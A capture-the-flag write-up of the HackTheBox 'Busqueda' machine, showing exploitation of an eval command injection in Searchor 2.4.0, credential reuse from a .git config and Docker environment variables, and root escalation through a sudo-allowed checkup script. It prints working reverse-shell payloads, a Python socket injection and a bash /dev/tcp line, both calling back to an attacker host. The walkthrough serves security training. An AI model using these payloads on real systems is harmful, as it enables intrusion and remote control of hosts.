# Busqueda - HackTheBox - Writeup
Linux, 30 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![‏‏Busqueda.JPG](images/Busqueda.JPG)
 
## TL;DR

To solve this machine, we start by using `nmap` to enumerate open services and find ports `22`, and `80`.

***User***: While monitoring port `80`, we discovered that it was utilizing version `2.4.0` of `Searchor`. After examining the source code on `Githu`b, we identified a command injection vulnerability within the `eval` function. Leveraging this vulnerability, we were able to obtain a reverse shell as `svc`. We subsequently located the `svc` password within the `.git` directory's `config` file.

***Root***: Upon running `sudo -l`, we determined that we could execute the `/opt/scripts/system-checkup.py` script as `root`. We then utilized the Python script to run the `docker-inspect` command, allowing us to inspect the currently running containers. Through this process, we discovered the credentials for `Gitea`. By creating a tunnel to `Gitea`, we were able to access the source code for `system-checkup.py`.
After thoroughly analyzing the source code, we determined that we could create our own script and utilize the `system-checkup.py` argument to execute it with root privileges.

![pwn.JPG](images/pwn.JPG)


## Busqueda Solution

### User

Let's begin by using `nmap` to scan the target machine:

```console
┌─[evyatar9@parrot]─[/hackthebox/Busqueda]
└──╼ $ nmap -sV -sC -oA nmap/Busqueda 10.10.11.208
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-23 22:06 IDT
Nmap scan report for 10.10.11.208
Host is up (0.074s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)

```

Observing port `80`, we see that the following web page is hosted:

![port80.JPG](images/port80.JPG)

It appears that the version currently in use is `2.4.0`, as confirmed by the repository located at https://github.com/ArjunSharda/Searchor.

Further examination of the `main.py` file for version `2.4.0` can be found at https://github.com/ArjunSharda/Searchor/blob/v2.4.0/src/searchor/main.py. Within this file, we can locate the search function:
```python
@click.argument("engine")
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
        if copy:
            click.echo("link copied to clipboard")
    except AttributeError:
        print("engine not recognized")

```

It has been identified that the `eval` function is being utilized and accepts user input. This presents an opportunity for command injection, which can be achieved by appending the following payload to the query string:
```python
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.14',4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

Upon successful injection of the payload, the `eval` function will execute the following command:
```python
eval"Engine.{engine}.search(', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.14',4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#, copy_url={copy}, open_web={open})")
```

Executing the aforementioned query containing the payload in the query string will result in the successful execution of the eval function:

![command.JPG](images/command.JPG)

Which in turn will spawn a reverse shell:
```console
┌─[evyatar9@parrot]─[/hackthebox/Busqueda]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from searcher.htb [10.10.11.208] 53434
/bin/sh: 0: can't access tty; job control turned off
$ whoami
svc
```

Upon running the command `ls -ltra`, we were able to identify the existence of a `.git` folder. Within this folder, we located the `config` file containing the following credentials: `cody:jh1usoih2bkjaspwe92`:
```console
$ ls -ltra
total 20
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
drwxr-xr-x 8 www-data www-data 4096 Apr 23 19:06 .git
$ cd .git
$ ls -ltra
total 52
drwxr-xr-x 5 www-data www-data 4096 Dec  1 14:35 refs
drwxr-xr-x 9 www-data www-data 4096 Dec  1 14:35 objects
drwxr-xr-x 3 www-data www-data 4096 Dec  1 14:35 logs
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 info
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 hooks
-rw-r--r-- 1 www-data www-data   21 Dec  1 14:35 HEAD
-rw-r--r-- 1 www-data www-data   73 Dec  1 14:35 description
-rw-r--r-- 1 www-data www-data  294 Dec  1 14:35 config
-rw-r--r-- 1 www-data www-data   15 Dec  1 14:35 COMMIT_EDITMSG
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 branches
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..
-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
drwxr-xr-x 8 www-data www-data 4096 Apr 23 19:06 .
$ cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

It has been determined that the password `jh1usoih2bkjaspwe92` corresponds to the `svc` user account. We can utilize this password to establish an SSH connection to the server:
```console
console
┌─[evyatar9@parrot]─[/hackthebox/Busqueda]
└──╼ $ ssh svc@searcher.htb 
svc@searcher.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Apr 23 08:07:31 PM UTC 2023

  System load:                      0.16015625
  Usage of /:                       80.7% of 8.26GB
  Memory usage:                     49%
  Swap usage:                       0%
  Processes:                        235
  Users logged in:                  0
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.208
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:5d86


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.14
svc@busqueda:~$ cat user.txt
d325f2d6ca3faa1136daa246a20c6ea7
```

And we get the user flag `d325f2d6ca3faa1136daa246a20c6ea7`.

### Root

Upon executing the command `sudo -l`, we were able to ascertain that the `svc` user account possesses the necessary permissions to execute the following python script as `root`:
```console
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Upon executing the `python` script, we received the following outpu:
```console
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

The output of the `python` script indicates that we have permission to execute two Docker commands, namely `docker-ps` and `docker-inspect`.

We can execute the `docker-ps` command to list the currently running Docker containers:
```console
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Based on the output of the `docker-ps` command, it appears that there are two running Docker containers. We can utilize the `docker-inspect` command to obtain a detailed `JSON` configuration for each of these containers:
```console
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
--format={"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}

svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' f84a6b33fb5a
--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

After inspecting the Docker containers using the `docker-inspect` command, we were able to obtain the `Gitea` credentials. 

Upon executing the `netstat` command, the following information was obtained:
```console
svc@busqueda:/opt/scripts$ netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:45243         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:38844         127.0.0.1:3000          TIME_WAIT  
tcp        0     52 10.10.11.208:22         10.10.14.5:41082        ESTABLISHED
tcp        0      0 172.19.0.1:54160        172.19.0.2:3000         TIME_WAIT  
tcp        0      0 172.19.0.1:43842        172.19.0.3:3306         TIME_WAIT  
tcp        0      0 127.0.0.1:5000          127.0.0.1:54336         TIME_WAIT  
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
```

The `netstat` command has revealed that `Gitea` is currently running on port `3000`. To access this service, we can create a tunnel to port `3000` using the following command:
```console
┌─[evyatar9@parrot]─[/hackthebox/Busqueda]
└──╼ $ ssh -N -L 3000:127.0.0.1:3000 svc@searcher.htb 
svc@searcher.htb's password: 

```

By creating a tunnel to port `3000` as described previously and navigating to the URL http://127.0.0.1:3000/ using a web browser, we are able to access the Gitea web page:

![gitea.JPG](images/gitea.JPG)

After successfully logging in to Gitea using the administrator user account with the password yuiu1hoiu4i5ho1uh, the following page was displayed:

![giteahome.JPG](images/giteahome.JPG)

Upon inspecting the source code of `system-checkup.py` at the URL http://127.0.0.1:3000/administrator/scripts/src/branch/main/system-checkup.py, we can see the following code snippet:

![full-checkup.JPG](images/full-checkup.JPG)

Based on the source code of `system-checkup.py`, it appears that we can create a new script called `full-checkup.sh` in any writable directory on the system. We can then specify this script as an argument to `system-checkup.py` in order to execute it with root privileges:
```console
svc@busqueda:/tmp/test$ at full-checkup.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.14/4242 0>&1
svc@busqueda:/tmp/test$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

After successfully creating and executing the `full-checkup.sh` script as described previously, we are able to obtain a reverse shell with `root` privileges:
```console
┌─[evyatar9@parrot]─[/hackthebox/Busqueda]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from searcher.htb [10.10.11.208] 39100
root@busqueda:/tmp/test# cat /root/root.txt
cat /root/root.txt
7919157d24f9969b887f8ab34220180c
```

And we get the root flag `7919157d24f9969b887f8ab34220180c`.
